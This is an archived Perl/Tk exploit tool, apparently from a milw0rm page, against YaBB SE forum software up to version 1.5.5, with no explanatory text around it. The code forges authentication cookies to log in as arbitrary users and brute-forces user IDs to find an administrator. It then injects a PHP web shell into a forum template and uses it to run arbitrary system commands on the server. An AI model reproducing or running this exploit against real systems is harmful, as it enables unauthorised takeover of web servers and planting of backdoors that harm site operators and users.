<html><head><title>YaBB SE <= 1.5.5 Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

## YaBB SE version &lt;= 1.5.5 commands execution exploit by RST/GHC
## GUI version =)))
##  
##        THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE
##                   KEEP IT PRIVATE
##
## (c)oded by 1dt.w0lf
## http://rst.void.ru
## http://ghc.ru


use Tk;
use Tk::Menu;
use LWP::UserAgent;

$top = MainWindow-&gt;new();
$top-&gt;title(&quot;r57yabbse155ceGUI&quot;);
$top-&gt;resizable(0,0);

$url = 'http://server/forum/index.php';
$id  = '1';
$cookie_name = 'YaBBSE155';
$cmd = 'ls -la; id; uname -a;';
$_button_1_text = 'Found admin ID';
$found_admin_id = \&amp;found_admin_id_start;
$stop = 0;

$xpl = LWP::UserAgent-&gt;new() or die;

Dialog::ui($top);

Dialog::run() if defined &amp;Dialog::run;

Tk::MainLoop();

sub get_cookie_name()
 {
 $_text_1-&gt;delete(&quot;0.0&quot;,'end');
 $_text_1-&gt;insert('end', &quot;[~] Try get cookie name\n&quot;);
 $res = $xpl-&gt;get($url.'?action=logout&amp;sesc=1','Cookie'=&gt;'PHPSESSID=1');
 if(!$res-&gt;is_success) { &amp;connect_error(); }
 else
  {
  $cookie = '';
  if($res-&gt;as_string =~ /Set-Cookie: (.*)=deleted;/) { $cookie = $1; }
  if($cookie ne '') { $_text_1-&gt;insert('end', &quot;[+] COOKIE NAME: &quot;.$cookie.&quot;\n&quot;); $cookie_name = $cookie; }
  else { $_text_1-&gt;insert('end', &quot;[-] Can't get cookie name\n&quot;); }
  }
 }

sub found_admin_id_stop()
 {
 $stop = 1;
 $_button_1_text = 'Found admin ID';
 $found_admin_id = \&amp;found_admin_id_start;
 }

sub found_admin_id_start()
 {
 $_button_1_text = '     Stop     ';
 $found_admin_id = \&amp;found_admin_id_stop;
 $_text_1-&gt;delete(&quot;0.0&quot;,'end');
 $_text_1-&gt;insert('end', &quot;[~] Try found admin ID\n&quot;);
 $success = 0;
 $error = 0;
 while(1)
  {
  last if $stop;  
  if(&amp;login()){
  if(&amp;user_exist())
   {
   if(&amp;user_admin()) { $success = 1; last; }
   }
  }
  if($error) { last; }
  $id++;
  }
 if($success) { $_text_1-&gt;insert('end', &quot;[+] ADMIN ID: &quot;.$id.&quot;\n&quot;); }
 $_button_1_text = 'Found admin ID';
 $found_admin_id = \&amp;found_admin_id_start;
 $stop = 0;
 }

sub create_cookie()
 {
 return $cookie_name.'=a%3A2%3A%7Bi%3A0%3Bs%3A'.length($id).'%3A%22'.$id.'%22%3Bi%3A1%3Bb%3A1%3B%7D';   
 }

sub login()
 {
 $_text_1-&gt;insert('end', &quot;[~] Try login with USER ID: &quot;.$id.&quot;\n&quot;);
 $top-&gt;update();
 $res = $xpl-&gt;get($url,cookie =&gt; &amp;create_cookie);
 if(!$res-&gt;is_success) { $error = 1; &amp;connect_error(); return 0; }
 else { return 1; }
 }

sub user_exist()
 {
 if($res-&gt;as_string =~ /action=profile/) { $_text_1-&gt;insert('end', &quot;[+] Successfully logged in\n&quot;); return 1; }
 else { $_text_1-&gt;insert('end', &quot;[-] User with this ID not exists\n&quot;); return 0; }
 $top-&gt;update();
 }
 
sub user_admin()
 {
 if($res-&gt;as_string =~ /action=admin/) { $_text_1-&gt;insert('end', &quot;[+] This user have admin rights\n&quot;); return 1; }
 else { $_text_1-&gt;insert('end', &quot;[-] This user don't have admin rights\n&quot;); return 0; }  
 $top-&gt;update();
 }

sub create_shell()
 {
 $_text_1-&gt;delete(&quot;0.0&quot;,'end');  
 $_text_1-&gt;insert('end', &quot;[~] Try create shell\n&quot;);
 $res = $xpl-&gt;get($url.'?action=modtemp',cookie =&gt; &amp;create_cookie);
 if(!$res-&gt;is_success) { &amp;connect_error(); }
 else
  {
  $_text_1-&gt;insert('end', &quot;[~] Try get &amp; edit template\n&quot;); 
  @data = split(/\n/,$res-&gt;content());
  $t = $sc = '';
  $already = 0;
  foreach(@data)
   {
   if(/input type=&quot;hidden&quot; name=&quot;sc&quot; value=&quot;([^&quot;]*)&quot;/) { $sc = $1; }   
   if(/RST_GHC_TEMPLATE/) { $already = 1; last; }   
   if(/(.*)&lt;\/textarea&gt;/) { $t .= $1.&quot;\n&quot;; $p = 0; }
   $t .= $_.&quot;\n&quot; if $p;
   if(/&lt;textarea[^&gt;]*name=&quot;template&quot;[^&gt;]*&gt;(.*)/) { $t .= $1.&quot;\n&quot;; $p = 1; }
   }
  if($already)
   {
   $_text_1-&gt;insert('end', &quot;[!] Template already modified\n[+] Skip Template editing\n&quot;);  
   }
  else
   {
   $_text_1-&gt;insert('end', &quot;[~] Edit Template\n&quot;);
   $new_t = '&lt;? if(isset($_POST[\'RSTGHC\'])) { echo &quot;RST_GHC_TEMPLATE&quot;; passthru($_POST[\'RSTGHC\']); echo &quot;RST_GHC_TEMPLATE&quot;; } ?&gt;';

   $t =~ s/&amp;lt;/&lt;/g;
   $t =~ s/&amp;gt;/&gt;/g;
   $t =~ s/&amp;quot;/&quot;/g;
   $t =~ s/&amp;amp;/&amp;/g;
   $t =~ s/&amp;nbsp;/ /g;

   $new_t .= $t;

   $res = $xpl-&gt;post($url,
                  [
                  'action'   =&gt; 'modtemp2',
                  'submit'   =&gt; 'Save',
                  'template' =&gt; $new_t,
                  'sc'       =&gt; $sc,
                  ]
                  ,cookie =&gt; 'PHPSESSID='.$sc.';'.&amp;create_cookie);
    }
   $_text_1-&gt;insert('end', &quot;[+] DONE!\n[!] Now you can execute commands\n&quot;);
 
  }
 }

sub execute_command()
 {
 $_text_1-&gt;delete(&quot;0.0&quot;,'end');
 $_text_1-&gt;insert('end',&quot;[~] Try execute command\n&quot;);
 $res = $xpl-&gt;post($url,['RSTGHC'=&gt;$cmd]);
 if(!$res-&gt;is_success) { &amp;connect_error(); }
 else
  {
  @rez = split(&quot;RST_GHC_TEMPLATE&quot;,$res-&gt;content);
  $_text_1-&gt;insert('end',@rez[1]);
  $_text_1-&gt;insert('end',&quot;[+] EOF\n&quot;);
  }
 }
 
sub connect_error()
 {
 $_text_1-&gt;insert('end', &quot;[-] Error: &quot;.$res-&gt;status_line.&quot;\n&quot;);  
 }

sub Dialog::ui {
    our($root) = @_;


    # Widget Initialization
    $_frame_6 = $root-&gt;Frame(
    );
    $_frame_12 = $root-&gt;Frame(
    );
    $_frame_13 = $root-&gt;Frame(
    );
    $_label_1 = $root-&gt;Label(
    -font =&gt; 'Webdings 24 bold',
    -text =&gt; &quot;!&quot;,
    );
    $_label_2 = $root-&gt;Label(
    -activebackground =&gt; &quot;#ff0000&quot;,
    -activeforeground =&gt; &quot;#ff0000&quot;,
    -font =&gt; '{Courier New} 8',
    -foreground =&gt; &quot;#ff0000&quot;,
    -text =&gt; &quot;YaBB SE &lt;= 1.5.5 command execution exploit by RST/GHC&quot;,
    );
    $_label_5 = $root-&gt;Label(
    -font =&gt; '{Courier New} 8',
    -text =&gt; &quot;PATH TO INDEX.PHP:&quot;,
    );
    $_label_6 = $root-&gt;Label(
    -font =&gt; '{Courier New} 8',
    -text =&gt; &quot;ADMIN ID:&quot;,
    );
    $_entry_4 = $root-&gt;Entry(
    -font =&gt; '{Courier New} 8',
    -relief =&gt; &quot;groove&quot;,
    -textvariable =&gt; \$url,
    -width =&gt; 65,
    );
    $_entry_7 = $root-&gt;Entry(
    -font =&gt; '{Courier New} 8',
    -relief =&gt; &quot;groove&quot;,
    -textvariable =&gt; \$id,
    );
    our($_entry_8) = $root-&gt;Entry(
    -font =&gt; '{Courier New} 8',
    -relief =&gt; &quot;groove&quot;,
    -textvariable =&gt; \$cookie_name,
    );
    $_label_8 = $root-&gt;Label(
    -font =&gt; '{Courier New} 8',
    -text =&gt; &quot;COOKIE NAME:&quot;,
    );
    $_button_2 = $root-&gt;Button(
    -font =&gt; '{Courier New} 8',
    -height =&gt; 1,
    -relief =&gt; &quot;groove&quot;,
    -text =&gt; &quot;Get cookie name&quot;,
    );
    $_button_3 = $root-&gt;Button(
    -font =&gt; '{Courier New} 8',
    -relief =&gt; &quot;groove&quot;,
    -text =&gt; &quot;Create shell&quot;,
    );
    $_label_10 = $root-&gt;Label(
    -font =&gt; '{Courier New} 8',
    -text =&gt; &quot;COMMAND FOR EXECUTE:&quot;,
    );
    $_button_6 = $root-&gt;Button(
    -font =&gt; '{Courier New} 8',
    -relief =&gt; &quot;groove&quot;,
    -text =&gt; &quot;Execute command&quot;,
    );
    $_entry_11 = $root-&gt;Entry(
    -font =&gt; '{Courier New} 8',
    -relief =&gt; &quot;groove&quot;,
    -textvariable =&gt; \$cmd,
    -width =&gt; 65,
    );
    $_text_1 = $root-&gt;Scrolled (
    'Text' ,
    -scrollbars =&gt; 'e' ,
    -wrap =&gt; 'word',
    -font =&gt; '{Courier New} 8',
    -height =&gt; 0,
    -relief =&gt; &quot;groove&quot;,
    -width =&gt; 0,

    );
    $_button_1 = $root-&gt;Button(
    -font =&gt; '{Courier New} 8',
    -relief =&gt; &quot;groove&quot;,
    -textvariable =&gt; \$_button_1_text,
    );
    $_label_3 = $root-&gt;Label(
    -anchor =&gt; &quot;nw&quot;,
    -compound =&gt; &quot;left&quot;,
    -font =&gt; '{Courier New} 8',
    -text =&gt; &quot;* 1 default for admin&quot;,
    );
    $_label_4 = $root-&gt;Label(
    -anchor =&gt; &quot;w&quot;,
    -font =&gt; '{Courier New} 8',
    -justify =&gt; &quot;left&quot;,
    -text =&gt; &quot;* YaBBSE155 default for version 1.5.5&quot;,
    );
    $_label_7 = $root-&gt;Label(
    -font =&gt; '{Courier New} 8',
    -text =&gt; &quot;(c)oded by 1dt.w0lf , RST/GHC , http://rst.void.ru , http://ghc.ru&quot;,
    );

    # widget commands


    $_button_2-&gt;configure(
    -command =&gt; \&amp;get_cookie_name
    );
    $_button_3-&gt;configure(
    -command =&gt; \&amp;create_shell
    );
    $_button_6-&gt;configure(
    -command =&gt; \&amp;execute_command
    );
    $_button_1-&gt;configure(
    -command =&gt; \$found_admin_id
    );


    # Geometry Management
    $_frame_6-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 3,
    -row    =&gt; 3,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;ew&quot;
    );
    $_frame_12-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 1,
    -row    =&gt; 3,
    -columnspan =&gt; 2,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;ne&quot;
    );
    $_frame_13-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 3,
    -row    =&gt; 4,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;&quot;
    );
    $_label_1-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 2,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;&quot;
    );
    $_label_2-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 3,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;&quot;
    );
    $_label_5-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 1,
    -row    =&gt; 2,
    -columnspan =&gt; 2,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;ne&quot;
    );
    $_label_6-&gt;grid(
    -in     =&gt; $_frame_12,
    -column =&gt; 1,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;e&quot;
    );
    $_entry_4-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 3,
    -row    =&gt; 2,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;w&quot;
    );
    $_entry_7-&gt;grid(
    -in     =&gt; $_frame_6,
    -column =&gt; 1,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;w&quot;
    );
    $_entry_8-&gt;grid(
    -in     =&gt; $_frame_6,
    -column =&gt; 1,
    -row    =&gt; 2,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;nw&quot;
    );
    $_label_8-&gt;grid(
    -in     =&gt; $_frame_12,
    -column =&gt; 1,
    -row    =&gt; 2,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;se&quot;
    );
    $_button_2-&gt;grid(
    -in     =&gt; $_frame_13,
    -column =&gt; 1,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;e&quot;
    );
    $_button_3-&gt;grid(
    -in     =&gt; $_frame_13,
    -column =&gt; 3,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;e&quot;
    );
    $_label_10-&gt;grid(
    -in     =&gt; $_frame_12,
    -column =&gt; 1,
    -row    =&gt; 3,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;se&quot;
    );
    $_button_6-&gt;grid(
    -in     =&gt; $_frame_13,
    -column =&gt; 4,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;e&quot;
    );
    $_entry_11-&gt;grid(
    -in     =&gt; $_frame_6,
    -column =&gt; 1,
    -row    =&gt; 3,
    -columnspan =&gt; 2,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;nw&quot;
    );
    $_text_1-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 1,
    -row    =&gt; 5,
    -columnspan =&gt; 3,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;news&quot;
    );
    $_button_1-&gt;grid(
    -in     =&gt; $_frame_13,
    -column =&gt; 2,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;&quot;
    );
    $_label_3-&gt;grid(
    -in     =&gt; $_frame_6,
    -column =&gt; 2,
    -row    =&gt; 1,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;ew&quot;
    );
    $_label_4-&gt;grid(
    -in     =&gt; $_frame_6,
    -column =&gt; 2,
    -row    =&gt; 2,
    -columnspan =&gt; 1,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;ew&quot;
    );
    $_label_7-&gt;grid(
    -in     =&gt; $root,
    -column =&gt; 1,
    -row    =&gt; 6,
    -columnspan =&gt; 3,
    -ipadx =&gt; 0,
    -ipady =&gt; 0,
    -padx =&gt; 0,
    -pady =&gt; 0,
    -rowspan =&gt; 1,
    -sticky =&gt; &quot;nw&quot;
    );


    # Resize Behavior
    $root-&gt;gridRowconfigure(1, -weight =&gt; 0, -minsize =&gt; 40, -pad =&gt; 0);
    $root-&gt;gridRowconfigure(2, -weight =&gt; 0, -minsize =&gt; 12, -pad =&gt; 0);
    $root-&gt;gridRowconfigure(3, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $root-&gt;gridRowconfigure(4, -weight =&gt; 0, -minsize =&gt; 40, -pad =&gt; 0);
    $root-&gt;gridRowconfigure(5, -weight =&gt; 1, -minsize =&gt; 250, -pad =&gt; 0);
    $root-&gt;gridRowconfigure(6, -weight =&gt; 0, -minsize =&gt; 27, -pad =&gt; 0);
    $root-&gt;gridColumnconfigure(1, -weight =&gt; 0, -minsize =&gt; 5, -pad =&gt; 0);
    $root-&gt;gridColumnconfigure(2, -weight =&gt; 1, -minsize =&gt; 54, -pad =&gt; 0);
    $root-&gt;gridColumnconfigure(3, -weight =&gt; 0, -minsize =&gt; 112, -pad =&gt; 0);
    $_frame_12-&gt;gridRowconfigure(1, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $_frame_12-&gt;gridRowconfigure(2, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $_frame_12-&gt;gridRowconfigure(3, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $_frame_12-&gt;gridColumnconfigure(1, -weight =&gt; 0, -minsize =&gt; 40, -pad =&gt; 0);
    $_frame_13-&gt;gridRowconfigure(1, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $_frame_13-&gt;gridColumnconfigure(1, -weight =&gt; 0, -minsize =&gt; 5, -pad =&gt; 0);
    $_frame_13-&gt;gridColumnconfigure(2, -weight =&gt; 0, -minsize =&gt; 40, -pad =&gt; 0);
    $_frame_13-&gt;gridColumnconfigure(3, -weight =&gt; 0, -minsize =&gt; 40, -pad =&gt; 0);
    $_frame_13-&gt;gridColumnconfigure(4, -weight =&gt; 0, -minsize =&gt; 40, -pad =&gt; 0);
    $_frame_6-&gt;gridRowconfigure(1, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $_frame_6-&gt;gridRowconfigure(2, -weight =&gt; 0, -minsize =&gt; 11, -pad =&gt; 0);
    $_frame_6-&gt;gridRowconfigure(3, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $_frame_6-&gt;gridColumnconfigure(1, -weight =&gt; 0, -minsize =&gt; 2, -pad =&gt; 0);
    $_frame_6-&gt;gridColumnconfigure(2, -weight =&gt; 1, -minsize =&gt; 54, -pad =&gt; 0);
}

1;

# milw0rm.com [2008-01-22]</pre></html>